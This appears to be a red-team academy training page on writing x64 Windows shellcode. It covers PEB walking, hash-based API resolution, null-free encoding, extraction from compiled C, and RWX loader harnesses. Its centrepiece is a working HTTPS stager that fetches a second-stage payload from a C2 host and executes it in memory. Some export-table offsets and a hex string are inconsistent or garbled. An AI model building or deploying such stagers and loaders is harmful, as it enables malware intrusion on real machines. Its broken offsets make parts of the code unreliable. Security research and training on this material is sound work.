---
layout: training-page
title: "Writing Shellcode from Scratch — Red Team Academy"
module: "Tool Development"
tags:
  - shellcode
  - assembly
  - nasm
  - x64
  - pic
  - stager
  - tool-dev
  - malware-dev
page_key: "tool-dev-shellcode-from-scratch"
render_with_liquid: false
updated: "2026-05-13"
---

# Writing Shellcode from Scratch

Custom shellcode development means writing position-independent code (PIC) that can be copied to any memory address and executed without a loader setting up relocations or import tables. Understanding this from first principles matters because: (1) you can write shellcode that does exactly what you need with minimal bytes and no third-party signatures, and (2) understanding shellcode mechanics is essential for shellcode analysis, loader development, and evasion research.

This page covers x64 Windows shellcode in NASM assembly, extracting shellcode from compiled C, null-free encoding, and building a custom stager in shellcode.

---

## Position-Independent Code: The Core Constraint

Regular executables (PE/ELF) use a loader: the OS parses import tables, resolves addresses, applies relocations, and then hands execution to the entry point. **Shellcode has none of this.** When your shellcode bytes are dropped into a process's memory and a thread is pointed at them, the only things that exist are:

1. The shellcode bytes themselves (you can reference them RIP-relative)
2. The calling thread's register state
3. The process's already-loaded DLLs (kernel32, ntdll)

The fundamental challenge is: **how do you call Windows API functions (like `CreateProcessA`, `VirtualAlloc`) when you don't have an import table?**

The answer is to walk the Process Environment Block (PEB) to find loaded DLL base addresses, then walk each DLL's export directory to resolve function addresses at runtime.

```
# PEB walk for shellcode — register states on entry:
#
# On Windows x64:
#   GS:[0x60] → PEB (Process Environment Block)
#   PEB+0x18  → PEB_LDR_DATA
#   PEB_LDR_DATA+0x20 → InMemoryOrderModuleList (circular doubly-linked list)
#
# Each LDR_DATA_TABLE_ENTRY:
#   +0x00  Flink (next entry)
#   +0x20  DllBase (loaded address of DLL)
#   +0x50  BaseDllName (UNICODE_STRING: length + buffer pointer)
#
# Walk the list to find kernel32.dll (it's always loaded by position 3:
#   [0]: the exe itself
#   [1]: ntdll.dll
#   [2]: kernel32.dll (on Windows 7+)
# — but don't rely on this order; compare names instead.
```

---

## x64 PEB Walk in NASM

```nasm
; shellcode_exec.asm — x64 Windows shellcode: spawn calc.exe
; Assembles to ~450 bytes (unoptimised for readability)
; Build:
;   nasm -f win64 shellcode_exec.asm -o shellcode_exec.o   (from Windows)
;   nasm -f bin   shellcode_exec.asm -o shellcode_exec.bin (flat binary)
; Extract bytes for embedding:
;   xxd -i shellcode_exec.bin

BITS 64
ORG 0                           ; RIP-relative addressing from offset 0

; ─── Entry point ────────────────────────────────────────────────────────────
_start:
    xor  rdi, rdi               ; RDI = 0 — clear for null-safe comparisons
    xor  rsi, rsi
    push rbp
    mov  rbp, rsp
    sub  rsp, 0x60              ; shadow space + local vars
    and  rsp, 0xFFFFFFFFFFFFFFF0  ; 16-byte align (required by x64 ABI)

; ─── Find kernel32.dll via PEB walk ──────────────────────────────────────────
find_kernel32:
    mov  rax, qword [gs:0x60]   ; RAX = PEB
    mov  rax, qword [rax+0x18]  ; RAX = PEB->Ldr (PEB_LDR_DATA*)
    mov  rsi, qword [rax+0x20]  ; RSI = InMemoryOrderModuleList.Flink (first entry)
    ; Skip first two entries (exe, ntdll), get third (kernel32)
    mov  rsi, qword [rsi]       ; RSI = 2nd entry (ntdll)
    mov  rsi, qword [rsi]       ; RSI = 3rd entry (kernel32)
    mov  rbx, qword [rsi+0x20]  ; RBX = kernel32 DllBase (IMAGE_DOS_HEADER*)

; ─── Get export directory ────────────────────────────────────────────────────
    ; Walk PE export table to find GetProcAddress, then use it
    ; (or resolve everything manually — shown here manually)
    mov  eax, dword [rbx+0x3C]  ; EAX = PE header offset (e_lfanew)
    mov  rdx, rbx
    add  rdx, rax               ; RDX = PE header (IMAGE_NT_HEADERS)
    ; On x64: IMAGE_NT_HEADERS.OptionalHeader starts at +24
    ; IMAGE_OPTIONAL_HEADER64.DataDirectory[0] (export) at +0x70 from optional header start
    mov  esi, dword [rdx+0x88]  ; ESI = ExportDirectory RVA
    add  rsi, rbx               ; RSI = ExportDirectory VA (IMAGE_EXPORT_DIRECTORY)

    ; RSI now points to IMAGE_EXPORT_DIRECTORY:
    ; +0x14  NumberOfNames (DWORD)
    ; +0x18  AddressOfFunctions (DWORD RVA)
    ; +0x1C  AddressOfNames (DWORD RVA)
    ; +0x20  AddressOfNameOrdinals (DWORD RVA)

    mov  ecx, dword [rsi+0x18]  ; ECX = NumberOfNames
    mov  edi, dword [rsi+0x1C]  ; EDI = AddressOfNames RVA
    add  rdi, rbx               ; RDI = AddressOfNames VA (array of RVAs to name strings)

; ─── Hash-based function lookup ──────────────────────────────────────────────
; Walking all names by string comparison is large; use ROR13 hash instead.
; ROR13: rotate name string right 13 bits per character, accumulate.
; Pre-computed hashes:
;   WinExec         = 0x876F8B31  (common in shellcode — executes a string command)
;   CreateProcessA  = 0x16B3FE72
;   LoadLibraryA    = 0xEC0E4E8E

find_winexec:
    xor  r8d, r8d               ; loop counter = 0
.loop:
    cmp  r8d, ecx
    jge  .done                  ; not found — exit
    ; Get name pointer
    mov  eax, dword [rdi+r8*4]  ; EAX = RVA of name[i]
    add  rax, rbx               ; RAX = VA of name string
    ; Compute ROR13 hash of name
    push rcx
    call ror13_hash             ; returns hash in EAX, clobbers RCX
    pop  rcx
    cmp  eax, 0x876F8B31        ; compare to WinExec hash
    je   .found
    inc  r8d
    jmp  .loop
.found:
    ; Get function address from ordinal table
    mov  edi, dword [rsi+0x20]  ; EDI = AddressOfNameOrdinals RVA
    add  rdi, rbx
    movzx eax, word [rdi+r8*2] ; EAX = ordinal[i]
    mov  edi, dword [rsi+0x18]  ; EDI = AddressOfFunctions RVA
    add  rdi, rbx
    mov  eax, dword [rdi+rax*4] ; EAX = function RVA
    add  rax, rbx               ; RAX = WinExec VA
    mov  [rbp-8], rax           ; save WinExec address
.done:

; ─── Call WinExec("calc.exe", SW_SHOW) ──────────────────────────────────────
; x64 calling convention: RCX=arg1, RDX=arg2, R8=arg3, R9=arg4
; Stack must be 16-byte aligned at call site; we allocated 0x60 above.
call_winexec:
    lea  rcx, [rel cmd_string]  ; RCX = pointer to "calc.exe\0"
    mov  edx, 1                 ; RDX = SW_SHOW
    mov  rax, [rbp-8]           ; RAX = WinExec
    call rax

exit:
    add  rsp, 0x60
    pop  rbp
    ret

; ─── ROR13 hash subroutine ───────────────────────────────────────────────────
ror13_hash:
    ; Input: RAX = pointer to null-terminated string
    ; Output: EAX = ROR13 hash
    xor  ecx, ecx               ; hash accumulator
.next_char:
    movzx edx, byte [rax]       ; load next char
    test  edx, edx
    jz    .done
    ror   ecx, 13               ; rotate accumulator right 13
    add   ecx, edx              ; add char value
    inc   rax
    jmp   .next_char
.done:
    mov   eax, ecx
    ret

; ─── Data section ────────────────────────────────────────────────────────────
; Place data AFTER code in flat bin — accessed via RIP-relative addressing
cmd_string:
    db "calc.exe", 0
```

---

## Null-Free Shellcode

Shellcode is often delivered via a string copy (strcpy, sprintf) or injected into a string-based vulnerability. These functions treat `0x00` as a string terminator, truncating the shellcode. You must ensure no null bytes in your shellcode.

```
# Checking for nulls:
nasm -f bin shellcode_exec.asm -o sc.bin
xxd sc.bin | grep ' 00 '   # any line with 00 is a problem

# Common null-producing patterns and fixes:
#
# Problem: xor eax, eax — uses 32-bit form, which zero-extends → top 4 bytes = 0x00000000
#          But xor itself doesn't produce nulls. The null comes from encoding MOV with 0.
#
# Problem: mov ecx, 1   → 0xB9 0x01 0x00 0x00 0x00  (3 null bytes!)
# Fix:     xor ecx, ecx
#          inc ecx      → 0x31 0xC9 0xFF 0xC1  (no nulls)
#
# Problem: mov edx, 0   → 0xBA 0x00 0x00 0x00 0x00  (4 null bytes!)
# Fix:     xor edx, edx → 0x31 0xD2  (no nulls)
#
# Problem: push 0       → 0x6A 0x00  (one null)
# Fix:     xor rax, rax
#          push rax     → no nulls
#
# Problem: jmp short 0x0C  when offset < 0x80 → no null (1-byte offset)
#          jmp near 0x100  → 0xE9 0x00 0x01 0x00 0x00  (nulls)
# Fix:     restructure to keep all relative jumps short (< 128 bytes)
#
# Problem: call instruction with address → may produce nulls depending on offset
# Fix:     use call-pop pattern for RIP-relative PC:
;          call .next
; .next:   pop  rax     ; RAX = address of .next (current RIP)
#
# Problem: string literal "WinExec\0" — the \0 terminator is needed
# Fix:     This is OK if the string is read-only data, not injected through a string API.
#          For the exploit delivery case, use alternative encodings (XOR, shift cipher)
#          and decode at runtime.
```

```nasm
; Null-free example: push "calc" as DWORD without null bytes
; "calc" = 0x636C6163 — no null bytes
; "calc.exe" = we can't push as a 64-bit literal without padding with 0x00
; Solution: use XOR trick to zero pad at runtime

push_calc_nullfree:
    ; Push "calc.exe\0\0\0\0\0\0\0" onto stack (null-padded to 8 bytes)
    ; Approach: XOR into register, push that
    ; "calc.exe" = 63 61 6C 63 2E 65 78 65
    ; As QWORD: 0x65786502632C6163 — contains nulls? Let's check:
    ;           65 78 65 2E 63 6C 61 63 — no nulls!
    ; Actually "calc.exe" reversed as bytes in memory (little-endian qword):
    ;   push 0x6578652E636C6163  → no nulls in this case — lucky!
    ;
    ; General pattern for strings with null bytes in the QWORD value:
    ;   xor rax, rax      ; RAX = 0
    ;   push rax          ; push null terminator (stored before string)
    ;   mov rax, 0x6578652E636C6163
    ;   push rax          ; push "calc.exe"
    ;   mov rcx, rsp      ; RCX = pointer to "calc.exe\0"
    xor  rax, rax
    push rax                        ; null terminator (from xored register, not immediate)
    mov  rax, 0x6578652E636C6163   ; "calc.exe" in little-endian
    push rax
    mov  rcx, rsp                   ; RCX → "calc.exe\0"
```

---

## Extracting Shellcode from Compiled C

Writing raw ASM is powerful but slow. A faster workflow: write shellcode logic in C with `-fno-pie -nostdlib`, compile, extract the `.text` section bytes.

```c
/* shellcode.c — shellcode written in C (x64 Windows)
 * Constraint: NO global variables, NO imports, NO CRT, PIC only
 * Build (Linux cross-compile):
 *   x86_64-w64-mingw32-gcc -nostdlib -fno-stack-protector -masm=intel \
 *       -Os -c shellcode.c -o shellcode.o
 * Extract .text section:
 *   objcopy -O binary --only-section=.text shellcode.o shellcode.bin
 * Verify no nulls:
 *   xxd shellcode.bin | grep ' 00 '
 * Embed in C array:
 *   xxd -i shellcode.bin > shellcode_array.h
 */

/* Must be inline-able — no external function calls until API resolved */
typedef unsigned char  u8;
typedef unsigned short u16;
typedef unsigned int   u32;
typedef unsigned long long u64;
typedef void* PVOID;
typedef PVOID HANDLE;
typedef unsigned long DWORD;
typedef int BOOL;
typedef char* LPSTR;

/* Windows data structures (minimal definitions) */
typedef struct {
    u16 Length;
    u16 MaximumLength;
    u16* Buffer;
} UNICODE_STRING;

typedef struct _LIST_ENTRY {
    struct _LIST_ENTRY* Flink;
    struct _LIST_ENTRY* Blink;
} LIST_ENTRY;

typedef struct {
    u8  Reserved1[2];
    u8  BeingDebugged;
    u8  Reserved2[21];
    LIST_ENTRY* Ldr;
    /* ... more fields ... */
} PEB;

typedef struct {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID      DllBase;
    PVOID      EntryPoint;
    DWORD      SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} LDR_MODULE;

/* ROR13 hash — must match what we use to look up function names */
static __attribute__((noinline)) u32 ror13(const char* name) {
    u32 hash = 0;
    while (*name) {
        hash = (hash >> 13) | (hash << 19);  /* ROR 13 */
        hash += (u8)*name++;
    }
    return hash;
}

/* Walk PE export table and return function VA matching hash */
static __attribute__((noinline)) PVOID get_func(PVOID base, u32 hash) {
    u8* b = (u8*)base;
    u32 pe_off = *(u32*)(b + 0x3C);
    u8* pe = b + pe_off;
    u32 exp_rva = *(u32*)(pe + 0x88);  /* DataDirectory[0].VirtualAddress */
    u8* exp = b + exp_rva;
    u32 num_names = *(u32*)(exp + 0x18);
    u32* names    = (u32*)(b + *(u32*)(exp + 0x1C));
    u16* ords     = (u16*)(b + *(u32*)(exp + 0x20));
    u32* funcs    = (u32*)(b + *(u32*)(exp + 0x18));
    /* Note: AddressOfFunctions is at offset 0x1C in IMAGE_EXPORT_DIRECTORY,
     * AddressOfNames is at 0x20, AddressOfNameOrdinals at 0x24 — double-check
     * the actual offsets in WinAPI documentation */
    for (u32 i = 0; i < num_names; i++) {
        const char* fname = (const char*)(b + names[i]);
        if (ror13(fname) == hash) {
            u32 func_rva = funcs[ords[i]];
            return b + func_rva;
        }
    }
    return 0;
}

/* Entry point — called when shellcode bytes are executed */
void go(void) {
    /* Get PEB via GS register intrinsic */
    PEB* peb = (PEB*)__readgsqword(0x60);
    /* Walk module list: [0]=exe, [1]=ntdll, [2]=kernel32 */
    LIST_ENTRY* head = peb->Ldr->Flink;      /* actually InMemoryOrderModuleList */
    LDR_MODULE* k32  = (LDR_MODULE*)((u8*)head->Flink->Flink - 0x10);
    PVOID k32base    = k32->DllBase;

    /* Resolve WinExec (hash = 0x876F8B31) */
    typedef DWORD (*WinExecFn)(LPSTR lpCmdLine, DWORD uCmdShow);
    WinExecFn pWinExec = (WinExecFn)get_func(k32base, 0x876F8B31);
    if (pWinExec)
        pWinExec("calc.exe", 1);
}
```

```bash
# Full extraction pipeline
x86_64-w64-mingw32-gcc \
    -nostdlib \
    -fno-stack-protector \
    -fno-pie \
    -Os \
    -masm=intel \
    -c shellcode.c -o shellcode.o

# Disassemble to verify no CRT references:
objdump -d -M intel shellcode.o | head -80

# Extract raw .text bytes:
objcopy -O binary --only-section=.text shellcode.o shellcode.bin

# Check size and null bytes:
wc -c shellcode.bin
xxd shellcode.bin | grep -c ' 00 '   # should be 0 for null-free

# Embed as C byte array:
xxd -i shellcode.bin
# Output: unsigned char shellcode_bin[] = { 0x48, 0x83, ... };
#         unsigned int shellcode_bin_len = NNN;
```

---

## Building a Custom Stager

A stager is tiny shellcode whose only job is to download the full-size payload (stage 2) from the C2 and execute it in memory. Stagers enable small initial footprints — a 300-byte stager is far more portable than a 1MB implant.

```c
/* stager.c — HTTPS stager shellcode (C, cross-compiled)
 * Downloads stage2 from a URL, allocates RX memory, executes it.
 * Requires: WinINet (wininet.dll) — preloaded on most Windows systems.
 * Size: ~1.5KB compiled; can be reduced further by hand-optimising
 */

/* Function type declarations */
typedef PVOID (*LoadLibraryA_t)(const char*);
typedef PVOID (*GetProcAddress_t)(PVOID, const char*);
typedef PVOID (*VirtualAlloc_t)(PVOID, u64, u32, u32);
typedef BOOL  (*VirtualProtect_t)(PVOID, u64, u32, u32*);
typedef PVOID (*InternetOpenA_t)(const char*, u32, const char*, const char*, u32);
typedef PVOID (*InternetOpenUrlA_t)(PVOID, const char*, const char*, u32, u32, u64*);
typedef BOOL  (*InternetReadFile_t)(PVOID, PVOID, u32, u32*);
typedef BOOL  (*InternetCloseHandle_t)(PVOID);

void go(void) {
    /* PEB walk → kernel32.dll base */
    PEB* peb = (PEB*)__readgsqword(0x60);
    LIST_ENTRY* mod = peb->Ldr->Flink->Flink->Flink;
    PVOID k32 = ((LDR_MODULE*)((u8*)mod - 0x10))->DllBase;

    /* Resolve LoadLibraryA and GetProcAddress */
    LoadLibraryA_t  pLoadLib = get_func(k32, 0xEC0E4E8E);  /* LoadLibraryA hash */
    GetProcAddress_t pGetProc = get_func(k32, 0x7802F749);  /* GetProcAddress hash */
    VirtualAlloc_t  pVAlloc  = get_func(k32, 0x91AFCA54);  /* VirtualAlloc hash */

    if (!pLoadLib || !pGetProc || !pVAlloc) return;

    /* Load wininet.dll */
    PVOID wininet = pLoadLib("wininet.dll");
    if (!wininet) return;

    InternetOpenA_t    pInetOpen    = pGetProc(wininet, "InternetOpenA");
    InternetOpenUrlA_t pInetOpenUrl = pGetProc(wininet, "InternetOpenUrlA");
    InternetReadFile_t pInetRead    = pGetProc(wininet, "InternetReadFile");

    if (!pInetOpen || !pInetOpenUrl || !pInetRead) return;

    /* Open internet handle with a plausible User-Agent */
    PVOID hInet = pInetOpen(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        0, NULL, NULL, 0       /* INTERNET_OPEN_TYPE_PRECONFIG = 0 */
    );
    if (!hInet) return;

    /* Download stage 2 from C2 */
    const char* stage2_url = "https://c2.example.com/stage2.bin";
    u64 ctx = 0;
    PVOID hUrl = pInetOpenUrl(hInet, stage2_url, NULL, 0,
        0x80000000 /* INTERNET_FLAG_RELOAD */ | 0x00800000 /* NO_CACHE_WRITE */,
        &ctx);
    if (!hUrl) return;

    /* Read stage 2 into a heap buffer */
    u8 stage2[0x100000];   /* 1MB max — use VirtualAlloc for larger */
    u32 total = 0, read = 0;
    do {
        InternetReadFile_t pRead = (InternetReadFile_t)pInetRead;
        pRead(hUrl, stage2 + total, sizeof(stage2) - total, &read);
        total += read;
    } while (read > 0 && total < sizeof(stage2));

    if (total == 0) return;

    /* Allocate RX memory for stage 2 and copy */
    VirtualProtect_t pVProtect = get_func(k32, 0x844FF18D);
    PVOID exec_mem = pVAlloc(NULL, total, 0x3000 /*MEM_COMMIT|RESERVE*/, 0x04 /*RW*/);
    if (!exec_mem) return;

    /* memcpy: no CRT, inline loop */
    for (u32 i = 0; i < total; i++)
        ((u8*)exec_mem)[i] = stage2[i];

    /* Flip RW → RX */
    u32 old;
    if (pVProtect) pVProtect(exec_mem, total, 0x20 /*PAGE_EXECUTE_READ*/, &old);

    /* Jump to stage 2 entry */
    ((void (*)(void))exec_mem)();
}
```

---

## Local Shellcode Test Harness

Testing shellcode without deploying it saves time and keeps your development machine clean.

```c
/* harness.c — local shellcode loader for testing
 * Place shellcode.bin next to this binary.
 * Compile: gcc -o harness harness.c (Linux, with Wine; or MSVC on Windows)
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>   /* Linux: mmap — on Windows use VirtualAlloc */

int main(int argc, char* argv[]) {
    const char* path = argc > 1 ? argv[1] : "shellcode.bin";

    /* Read shellcode from file */
    FILE* f = fopen(path, "rb");
    if (!f) { perror("fopen"); return 1; }
    fseek(f, 0, SEEK_END);
    long sz = ftell(f);
    rewind(f);
    unsigned char* buf = malloc(sz);
    fread(buf, 1, sz, f);
    fclose(f);

    printf("[*] Loaded %ld bytes from %s\n", sz, path);

    /* Dump first 32 bytes for inspection */
    printf("[*] First bytes: ");
    for (int i = 0; i < (sz < 32 ? sz : 32); i++)
        printf("%02x ", buf[i]);
    printf("\n");

    /* Verify no null bytes (for null-free requirement) */
    int nulls = 0;
    for (long i = 0; i < sz; i++) if (!buf[i]) nulls++;
    if (nulls) printf("[!] WARNING: %d null byte(s) found at offsets:\n", nulls);
    for (long i = 0; i < sz; i++) if (!buf[i]) printf("    0x%lx\n", i);

#ifdef _WIN32
    /* Windows: allocate RWX with VirtualAlloc */
    #include <windows.h>
    void* exec = VirtualAlloc(NULL, sz, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(exec, buf, sz);
    printf("[*] Executing shellcode at %p...\n", exec);
    ((void(*)(void))exec)();
    VirtualFree(exec, 0, MEM_RELEASE);
#else
    /* Linux (Wine/emulation): mmap anonymous RWX */
    void* exec = mmap(NULL, sz, PROT_READ|PROT_WRITE|PROT_EXEC,
                      MAP_ANON|MAP_PRIVATE, -1, 0);
    if (exec == MAP_FAILED) { perror("mmap"); return 1; }
    memcpy(exec, buf, sz);
    printf("[*] Executing shellcode at %p...\n", exec);
    ((void(*)(void))exec)();
    munmap(exec, sz);
#endif

    free(buf);
    return 0;
}
```

```python
# harness.py — Python shellcode test harness using ctypes (Windows)
# Useful for rapid iteration: edit shellcode, run this, no recompile needed
import ctypes
import sys

def run_shellcode(path: str):
    with open(path, "rb") as f:
        sc = bytearray(f.read())

    print(f"[*] Loaded {len(sc)} bytes")
    null_count = sc.count(0)
    if null_count:
        print(f"[!] {null_count} null byte(s)")
        for i, b in enumerate(sc):
            if b == 0:
                print(f"    offset 0x{i:04x}")

    # Allocate RWX memory
    kern32 = ctypes.windll.kernel32
    mem = kern32.VirtualAlloc(None, len(sc),
        0x3000,  # MEM_COMMIT | MEM_RESERVE
        0x40)    # PAGE_EXECUTE_READWRITE
    if not mem:
        print("[!] VirtualAlloc failed:", ctypes.get_last_error())
        return

    # Copy shellcode
    buf = (ctypes.c_char * len(sc))(*sc)
    ctypes.windll.kernel32.RtlMoveMemory(mem, buf, len(sc))

    print(f"[*] Executing at 0x{mem:016x}...")
    ht = kern32.CreateThread(None, 0, mem, None, 0, None)
    kern32.WaitForSingleObject(ht, 5000)  # wait up to 5s
    kern32.VirtualFree(mem, 0, 0x8000)

if __name__ == "__main__":
    run_shellcode(sys.argv[1] if len(sys.argv) > 1 else "shellcode.bin")
```

---

## Resources

- [Malware Development Series - 0xPat](https://0xpat.github.io/) — detailed x64 Windows shellcode development
- [Shellcode: System calls in Windows x64](https://modexp.wordpress.com/2018/08/24/shellcode-x64/) — NT API syscall shellcode
- [Writing Position Independent Shellcodes](https://www.exploit-db.com/docs/english/28553-linux-x86-shellcode-development.pdf) — foundational techniques
- [NimlineWhispers](https://github.com/ajpc500/NimlineWhispers2) — for generating syscall stubs
